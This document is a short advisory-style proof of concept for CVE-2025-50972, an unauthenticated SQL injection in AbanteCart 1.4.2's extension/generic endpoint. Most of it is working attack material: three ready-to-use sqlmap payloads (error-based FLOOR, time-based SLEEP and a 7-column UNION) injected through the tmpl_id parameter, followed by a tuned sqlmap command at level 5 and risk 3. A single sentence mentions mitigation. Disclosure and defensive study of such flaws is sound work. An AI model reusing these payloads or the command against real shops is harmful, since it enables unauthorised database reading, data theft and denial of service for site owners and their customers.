CVE-2025-50972




AbanteCart 1.4.2’s extension/generic endpoint is vulnerable to unauthenticated SQL injection via its URI parameter, allowing attackers to inject arbitrary queries. Three techniques have been demonstrated: error-based injection using a crafted FLOOR-based payload, time-based blind injection via SLEEP(), and UNION-based injection to extract arbitrary data. An attacker can exploit this flaw without any credentials to read or manipulate the database and even cause denial-of-service delays. Automation tools like sqlmap can fully exploit the vulnerability with high risk and confidence levels. Patching to a fixed version or enforcing parameterized queries and strict input validation will mitigate the issue


```
Parameter: #1* (URI)

Type: error-based

Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)

Payload: https://abantecart.mydomain.local/index.php?rt=extension/generic&layout_id=21&tmpl_id=novator' AND (SELECT 3875 FROM(SELECT COUNT(*),CONCAT(0x717a766b71,(SELECT (ELT(3875=3875,1))),0x7178766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LeJi&pb=Qu2sbP4VAZzalFIcmM7ZirFAsh5mjwZt



Type: time-based blind

Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)

Payload: https://abantecart.mydomain.local/index.php?rt=extension/generic&layout_id=21&tmpl_id=novator' OR SLEEP(5)-- molm&pb=Qu2sbP4VAZzalFIcmM7ZirFAsh5mjwZt



Type: UNION query

Title: Generic UNION query (NULL) - 7 columns

Payload: https://abantecart.mydomain.local/index.php?rt=extension/generic&layout_id=21&tmpl_id=novator' UNION ALL SELECT NULL,NULL,CONCAT(0x717a766b71,0x5774684b744b685477646a5750474952555a70454a776c77666442567169746d4b415749446d7178,0x7178766a71),NULL,NULL,NULL,NULL-- -&pb=Qu2sbP4VAZzalFIcmM7ZirFAsh5mjwZt

---
```


This is a unique case where cookies are wanted to be set.  This is the best command to use
```
python3 ~/tools/sqlmapproject-sqlmap-c8c7fee/sqlmap.py -r ./sql.txt --level 5 --risk 3 --force-ssl --dbms mysql --answers='you have not declared cookie=n,Do you want to follow?=y' --flush
```

![](https://github.com/4rdr/proofs/blob/main/gifs/abante-1.4.2-unauthenticated-sql-injection.gif?raw=true)

